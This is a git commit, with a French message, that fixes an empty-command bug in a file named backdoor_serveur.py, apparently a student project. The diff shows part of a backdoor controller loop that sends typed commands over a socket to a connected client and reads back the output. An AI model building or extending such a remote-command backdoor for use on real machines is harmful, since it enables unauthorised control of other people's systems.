be728de7b44ea3a7eddcbfe79289d4da634f3ba4
unknown <kaborejbaime@gmail.com>
2026-04-19 18:13:13 +0200

    Corriger le bug de la commande vide

--- Projet/backdoor_serveur.py
+++ Projet/backdoor_serveur.py
@@ -25,6 +25,8 @@ print(f"Connexion établie avec {client_address}")
 
 while True:
     commande = input("Commande: ")
+    if commande == "":
+        continue
     connection_socket.sendall(commande.encode())
     data_recues = connection_socket.recv(MAX_DATA_SIZE)
     if not data_recues:
